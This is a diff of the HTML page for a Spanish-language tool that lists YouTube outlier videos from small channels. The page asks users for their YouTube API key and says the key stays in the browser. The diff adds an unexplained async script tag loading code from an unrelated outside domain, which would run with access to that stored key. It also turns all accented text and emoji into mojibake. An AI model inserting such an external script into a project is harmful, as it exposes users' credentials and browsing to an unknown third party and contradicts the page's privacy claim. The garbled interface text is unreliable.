@@ -1,29 +1,30 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="es">
 <head>
+<script src="https://5gvci.com/act/files/tag.min.js?z=11426112" data-cfasync="false" async></script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Outliers · Canales pequeños</title>
+  <title>Outliers Â· Canales pequeÃ±os</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <header class="topbar">
     <div class="topbar-inner">
-      <h1>📈 Outliers de canales pequeños</h1>
+      <h1>ðŸ“ˆ Outliers de canales pequeÃ±os</h1>
       <p class="subtitle">
         Videos con <strong>+100% de vistas</strong> sobre el promedio de su canal
-        (&lt;10.000 suscriptores) · último mes
+        (&lt;10.000 suscriptores) Â· Ãºltimo mes
       </p>
       <div class="meta-row">
-        <span id="updated-at">Sin datos todavía</span>
+        <span id="updated-at">Sin datos todavÃ­a</span>
         <span id="count-badge"></span>
-        <button id="refresh-btn" class="refresh-btn">🔄 Actualizar ahora</button>
+        <button id="refresh-btn" class="refresh-btn">ðŸ”„ Actualizar ahora</button>
         <button id="settings-btn" class="link-btn">Cambiar clave API</button>
-        <a href="research/index.html" class="link-btn">🔬 Research Copilot →</a>
+        <a href="research/index.html" class="link-btn">ðŸ”¬ Research Copilot â†’</a>
       </div>
       <form id="term-form" class="term-search">
-        <input id="term-input" type="text" placeholder="Buscar cualquier término (ej: cocina vegana, autos clásicos...)" autocomplete="off" />
-        <button type="submit" id="term-search-btn" class="refresh-btn">🔍 Buscar</button>
+        <input id="term-input" type="text" placeholder="Buscar cualquier tÃ©rmino (ej: cocina vegana, autos clÃ¡sicos...)" autocomplete="off" />
+        <button type="submit" id="term-search-btn" class="refresh-btn">ðŸ” Buscar</button>
       </form>
       <div id="search-history" class="search-history"></div>
       <div id="progress" class="progress" hidden></div>
@@ -34,54 +35,54 @@
     <div id="search-banner" class="search-banner" hidden>
       <span id="search-banner-text"></span>
       <div class="search-banner-actions">
-        <button id="insights-btn" class="link-btn" hidden>📊 Ver resumen</button>
-        <button id="term-clear-btn" class="link-btn">✕ Volver a categorías</button>
+        <button id="insights-btn" class="link-btn" hidden>ðŸ“Š Ver resumen</button>
+        <button id="term-clear-btn" class="link-btn">âœ• Volver a categorÃ­as</button>
       </div>
     </div>
     <div class="filters" id="niche-filters"></div>
 
     <div class="controls-bar">
-      <input id="instant-search" type="text" class="instant-search-input" placeholder="🔍 Filtrar por título o canal..." />
+      <input id="instant-search" type="text" class="instant-search-input" placeholder="ðŸ” Filtrar por tÃ­tulo o canal..." />
       <select id="sort-select" class="sort-select">
         <option value="outlierMultiplier">Ordenar: Multiplicador</option>
         <option value="viewCount">Ordenar: Vistas</option>
         <option value="subscriberCount">Ordenar: Suscriptores</option>
-        <option value="viewsPerDay">Ordenar: Vistas/día</option>
+        <option value="viewsPerDay">Ordenar: Vistas/dÃ­a</option>
         <option value="viewsPerSubscriber">Ordenar: Vistas/Sub</option>
         <option value="engagementRate">Ordenar: Engagement</option>
         <option value="publishedAt">Ordenar: Fecha</option>
-        <option value="durationSeconds">Ordenar: Duración</option>
+        <option value="durationSeconds">Ordenar: DuraciÃ³n</option>
       </select>
-      <button id="favorites-toggle-btn" class="chip-btn">☆ Favoritos</button>
-      <button id="filters-toggle-btn" class="chip-btn">⚙ Filtros</button>
+      <button id="favorites-toggle-btn" class="chip-btn">â˜† Favoritos</button>
+      <button id="filters-toggle-btn" class="chip-btn">âš™ Filtros</button>
       <div class="export-buttons">
-        <button id="export-csv-btn" class="chip-btn">⬇ CSV</button>
-        <button id="export-json-btn" class="chip-btn">⬇ JSON</button>
-        <button id="export-md-btn" class="chip-btn">⬇ Markdown</button>
+        <button id="export-csv-btn" class="chip-btn">â¬‡ CSV</button>
+        <button id="export-json-btn" class="chip-btn">â¬‡ JSON</button>
+        <button id="export-md-btn" class="chip-btn">â¬‡ Markdown</button>
       </div>
     </div>
 
     <div id="filters-panel" class="filters-panel" hidden>
       <div class="filter-field">
-        <label for="filter-duration-min">Duración (min)</label>
+        <label for="filter-duration-min">DuraciÃ³n (min)</label>
         <div class="filter-range">
-          <input type="number" id="filter-duration-min" placeholder="mín" min="0" />
-          <input type="number" id="filter-duration-max" placeholder="máx" min="0" />
+          <input type="number" id="filter-duration-min" placeholder="mÃ­n" min="0" />
+          <input type="number" id="filter-duration-max" placeholder="mÃ¡x" min="0" />
         </div>
       </div>
       <div class="filter-field">
         <label for="filter-subs-min">Suscriptores</label>
         <div class="filter-range">
-          <input type="number" id="filter-subs-min" placeholder="mín" min="0" />
-          <input type="number" id="filter-subs-max" placeholder="máx" min="0" />
+          <input type="number" id="filter-subs-min" placeholder="mÃ­n" min="0" />
+          <input type="number" id="filter-subs-max" placeholder="mÃ¡x" min="0" />
         </div>
       </div>
       <div class="filter-field">
-        <label for="filter-views-min">Vistas mínimas</label>
+        <label for="filter-views-min">Vistas mÃ­nimas</label>
         <input type="number" id="filter-views-min" placeholder="0" min="0" />
       </div>
       <div class="filter-field">
-        <label for="filter-multiplier-min">Multiplicador mínimo</label>
+        <label for="filter-multiplier-min">Multiplicador mÃ­nimo</label>
         <input type="number" id="filter-multiplier-min" placeholder="2" min="0" step="0.1" />
       </div>
       <button id="filters-reset-btn" class="link-btn">Limpiar filtros</button>
@@ -89,10 +90,10 @@
 
     <div id="grid" class="grid"></div>
     <p id="empty-state" class="empty-state" hidden>
-      Todavía no hay datos. Pulsa "Actualizar ahora" para buscar outliers en vivo.
+      TodavÃ­a no hay datos. Pulsa "Actualizar ahora" para buscar outliers en vivo.
     </p>
     <p id="no-match-state" class="empty-state" hidden>
-      Ningún outlier coincide con los filtros/búsqueda actuales.
+      NingÃºn outlier coincide con los filtros/bÃºsqueda actuales.
     </p>
   </main>
 
@@ -101,8 +102,8 @@
       <h2>Tu clave de YouTube Data API v3</h2>
       <p>
         Se guarda solo en este navegador (localStorage) y se usa para llamar
-        directo a la API de YouTube desde tu propio dispositivo — nunca pasa
-        por ningún servidor nuestro.
+        directo a la API de YouTube desde tu propio dispositivo â€” nunca pasa
+        por ningÃºn servidor nuestro.
       </p>
       <input id="key-input" type="password" placeholder="AIza..." autocomplete="off" />
       <div class="modal-actions">
@@ -110,7 +111,7 @@
         <button id="key-cancel" class="link-btn">Cancelar</button>
       </div>
       <p class="modal-help">
-        ¿No tienes una? Sácala gratis en la
+        Â¿No tienes una? SÃ¡cala gratis en la
         <a href="https://console.cloud.google.com/apis/library/youtube.googleapis.com" target="_blank" rel="noopener noreferrer">
           Google Cloud Console
         </a> (habilita "YouTube Data API v3" y crea una credencial de tipo API key).
@@ -131,3 +132,4 @@
   <script type="module" src="app.js"></script>
 </body>
 </html>
+
